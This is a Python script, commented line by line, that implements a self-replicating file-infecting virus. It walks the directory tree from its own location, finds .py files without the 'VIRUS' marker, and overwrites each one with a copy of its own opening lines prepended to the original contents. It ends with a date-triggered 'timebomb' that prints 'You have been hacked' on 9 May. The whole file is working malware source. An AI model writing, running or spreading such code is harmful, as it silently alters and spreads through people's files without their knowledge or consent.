#!/usr/bin/python
import os
import datetime

#Signature that lets us know if the file is infected or not.
SIGNATURE = "VIRUS"

#Recursively locate files to infect in the given path
def locate(path):
    #Start with an empty array of file names.
    files_targeted = []
    #Get a list of files in the given path.
    filelist = os.listdir(path)
    #Run this series of commands for each entry in the new file list.
    for fname in filelist:
        #If the entry is a directory, run a command. 
        if os.path.isdir(path+"/"+fname):
            #Run the locate function on the directory to add more files to the file list.
            files_targeted.extend(locate(path+"/"+fname))
        #If the file is a python script, run these commands.
        elif fname[-3:] == ".py":
            #Set up the infected variable to default as false.
            infected = False
            #Look at each line in the given file.
            for line in open(path+"/"+fname):
                #Check to see if the virus signature is inside the file.
                if SIGNATURE in line:
                    #Set infected to true if we found the signature.
                    infected = True
                    break
            #If the file is clean:
            if infected == False:
                #Add the file for targetting for infection.
                files_targeted.append(path+"/"+fname)
    #Return the list of files that need to be infected
    return files_targeted

#Function to infect files found in the locate function.
def infect(files_targeted):
    #Open the contents of the current virus script.
    virus = open(os.path.abspath(__file__))
    #Initalize the virus string variable as nothing
    virusstring = ""
    #For each line in the virus file
    for i,line in enumerate(virus):
        #If the current line is greater or equal to 0 and less than 39
        if i >= 0 and i < 39:
            #Add the line to the virus string
            virusstring += line
    #Close the virus file read stream.
    virus.close
    #For each file in the files to infect array
    for fname in files_targeted:
        #Open the file for reading
        f = open(fname)
        #Put the current file contents into a temp variable
        temp = f.read()
        #Close the file stream.
        f.close()
        #Open file for writing.
        f = open(fname,"w")
        #Replace the file with the current virus file lines, and then append the previous contents saved in temp.
        f.write(virusstring + temp)
        #Close the file stream
        f.close()

#A timebomb print command
def detonate():
    #If the current month is May and the current day is the 9th, execute a print statement.
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"

#Start with targeting files in the current directory of the virus script.
files_targeted = locate(os.path.abspath(""))

#Infect the files found in the above function
infect(files_targeted)

#Run detonate
detonate()